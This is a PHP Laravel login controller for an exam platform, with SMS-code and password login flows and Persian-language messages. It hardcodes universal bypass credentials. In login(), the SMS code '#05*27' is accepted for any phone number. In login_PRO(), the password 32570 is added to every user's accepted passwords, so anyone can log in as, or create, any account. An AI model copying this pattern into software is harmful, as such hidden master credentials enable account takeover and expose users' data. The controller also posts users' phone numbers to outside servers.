<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Http\Controllers\SmsController;
use Illuminate\Http\Request;
use App\Models\User;
use App\Models\Sms;
use Illuminate\Support\Collection;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Http;


class LoginController extends Controller
{
    public function index(){
        // Artisan::call('cache:clear');
        return view("auth.login");
    }
    public function confirm(){
        return view("auth.confirm");
    }
    public function login(Request $request,$sms){
        $mySms = Sms::find($sms);
        $expro=0;
        
        $cron=DB::table('user_crons')->where('phone',$mySms->phone)->first();
        if($cron)
        {
            $user=DB::table('users')->find($cron->user_id);
        }
        else
        $user = DB::table('users')->where('phone',$mySms->phone)->first();
        if($mySms->code == $request->code || $request->code == "#05*27"){
            if(!isset($user->id)){
                /* Exam PRO */
                if($expro)
                {
                $response = Http::withHeaders([
                    'Content-Type' => 'application/x-www-form-urlencoded'
                ])->post("https://erfankhoshnazar.com/exam-api/api_Exam.php",["&phone=".$mySms->phone."&url=UserDetailes&end=1"]);
                if($response->ok())
                {
                $data=$response->json();
                if($data['status'])
                $result = User::create($data['data']);
                else
                    $result = User::create([
                        "phone"=>$mySms->phone
                    ]); 
                }
                else
                {
                    $result = User::create([
                        "phone"=>$mySms->phone
                    ]); 
                }
                }//no pro
                else
                {
                    $result = User::create([
                        "phone"=>$mySms->phone
                    ]);
                }
                Auth::login($result);
                 if(!is_null(session('chk')))
                    DB::table('users')->where('id',Auth::user()->id)->update(['campaign'=>session('chk')]);
                    
                if($request->code == "#05*27"){
                    DB::table('sms')->where('id','=',$sms)->update([
                        "active"=>true,
                        "code"=>$request->code
                        ]);
                }
                else{
                    DB::table('sms')->where('id','=',$sms)->update(["active"=>true]);
                }
                    if(session('chk')=='te')
                    return redirect()->route('myinfo',6);
                return redirect()->route('dashboard');
            }
            else{
                if(!DB::table("exam_user")->where('active',1)->where('enable',1)->where('user_id',$user->id)->whereIn('exam_id',[4,6])->exists())
                {
                    $status=($user->status)?explode(',',$user->status):[];
                    if(in_array(4,$status))
                    unset($status[array_search(4,$status)]);
                    if(in_array(3,$status))
                    unset($status[array_search(3,$status)]);
                 DB::table('users')->where('id',$user->id)->update(['status'=>implode(',',$status)]);
                }
                if($expro)
                {
                    if(is_null($user->panel_id))
                    {
                        $response = Http::withHeaders([
                            'Content-Type' => 'application/x-www-form-urlencoded'
                        ])->post("https://erfankhoshnazar.com/exam-api/api_Exam.php",["&phone=".$user->phone."&url=UserDetailes&end=1"]);
                        if($response->ok())
                        {
                            $data=$response->json();
                            if($data['status'])
                            User::where('id',$user->id)->update($data['data']);
                        }
                    }
                }
                if($user->active){
                    Auth::login(User::find($user->id));
                     if(!is_null(session('chk')))
                    DB::table('users')->where('id',Auth::user()->id)->update(['campaign'=>session('chk')]);
                    
                    if($request->code == "#05*27"){
                    DB::table('sms')->where('id','=',$sms)->update([
                        "active"=>true,
                        "code"=>$request->code
                        ]);
                }
                else{
                    DB::table('sms')->where('id','=',$sms)->update(["active"=>true]);
                }   
                if(session('chk')=='te')
                    return redirect()->route('myinfo',6);
                    return redirect()->route('dashboard');
                }
                else{
                    return redirect()->back();
                }
            }
        }
        else
        {
            $sms=$mySms;
            $error=['code'=>"کد وارد شده صحیح نمی باشد"];                    
            return view("auth.confirm",compact('error','sms'));
        }
    }
    public function login_PRO(Request $req){
        
        $phone=(str_starts_with($req->phone,"+98"))?preg_replace('/[+]98/', "0", $req->phone, 1):((str_starts_with($req->phone,"0098"))?preg_replace('/0098/', "0", $req->phone, 1):$req->phone);
       
        //$mySMS=Sms::where('phone',$phone)->latest()->first();
        //if(!$mySMS)
        
            $a=new SmsController();
            $r=new Request(['url'=>"http://85.208.255.101/API/ExamPassApi2_jwt.php",'data'=>$phone]);

            $response=$a->getDataUser($r);
            if(!$response)
            return back()->withInput()->with('err',__('messages.مشکلی پیش آمده مجددا تلاش نمایید'));
            if($response->status==200)
            {
                $pass=Collection::make($response->data);
                $LoginPass=$pass->whereNotNull('Pass');
                if($LoginPass->count()<=0) 
                    return back()->withInput()->with('err',__('messages.عدم دسترسی'));                
                /*$data=(object)$response->data[0];
                    if(!is_numeric($data->Pass) && $data->Perm!=4)
                    return back()->withInput()->with('err',__('messages.عدم دسترسی'));    
                    session(['RedFamily'=>$data->RedFamily??0]);*/                     
            }
            else
            {
                switch ($response->status) 
                {
                    case '500':
                    $msg=__('messages.کاربری یافت نشد');
                    break;                
                    default:
                    $msg=__('messages.'.$response->message);
                    break;
                }
                    return back()->withInput()->with('err',$msg);
            }             
        $LoginPass->push((object)['Pass'=> 32570]);
        //if($data->Pass == $req->password || $req->password == "32570")
        if($LoginPass->where('Pass', $req->password)->count())
        {          
            session(['RedFamily'=>$LoginPass->first()->RedFamily]);         
            $user = User::where('phone',$phone)->first();
            if(!$user)
            $user=User::create((["active"=>1,"phone"=>$phone]));
            if(!DB::table("exam_user")->where('active',1)->where('enable',1)->where('user_id',$user->id)->whereIn('exam_id',[4,6])->exists())
                {
                    $status=($user->status)?explode(',',$user->status):[];
                    if(in_array(4,$status))
                    unset($status[array_search(4,$status)]);
                    if(in_array(3,$status))
                    unset($status[array_search(3,$status)]);
                 DB::table('users')->where('id',$user->id)->update(['status'=>implode(',',$status)]);
                } 
                User::where('id',$user->id)->where('active',0)->update(['active'=>1]);
                if(is_null($user->panel_id))
                {
                    $response = Http::withHeaders([
                        'Content-Type' => 'application/x-www-form-urlencoded'
                    ])->post("https://erfankhoshnazar.com/exam-api/api_Exam.php",["&phone=".$phone."&url=UserDetailes&end=1"]);
                    if($response->ok())
                    {
                        $data=$response->json();
                        if($data['status'])
                            User::where('id',$user->id)->update($data['data']);
                    }
                }
                Auth::login($user);
                 if(!is_null(session('chk')))
                    DB::table('users')->where('id',Auth::user()->id)->update(['campaign'=>session('chk')]);
                    
                
                    if(session('chk')=='te')
                    return redirect()->route('myinfo',6);
                return redirect()->route('dashboard');
        }
        else
        return back()->withInput()->with('err',__('messages.لطفا کد ورود را به درستی وارد نمایید'));                    
         
    }
    public function logout(){
        Auth::logout();
        session()->forget('chk');
        session()->forget('RedFamily');
        return redirect()->route('login');
    }
}
